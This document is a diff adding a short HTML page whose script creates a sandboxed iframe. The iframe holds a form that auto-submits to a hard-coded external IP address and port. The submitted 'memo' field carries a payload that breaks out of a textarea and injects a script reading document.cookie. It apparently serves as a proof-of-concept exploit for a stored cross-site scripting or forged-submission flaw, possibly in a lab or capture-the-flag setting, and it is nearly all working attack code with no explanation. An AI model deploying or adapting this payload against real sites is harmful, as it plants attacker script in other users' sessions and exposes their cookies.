@@ -1,0 +1,8 @@
+<html><body><script>
+const inner = "<form id=\"f\" action=\"http://143.47.245.151:30560/save\" method=\"POST\"><textarea id=\"memo\" name=\"memo\"></textarea></form><script>var memo=document.getElementById(\"memo\");memo.value=\"</textarea><script>console.log(document.cookie)</scr\"+\"ipt>\";document.getElementById(\"f\").submit();</"+"script>";
+const frame = document.createElement("iframe");
+frame.setAttribute("sandbox","allow-forms allow-scripts");
+frame.srcdoc = inner;
+document.body.appendChild(frame);
+console.log("iframe injected");
+</script></body></html>
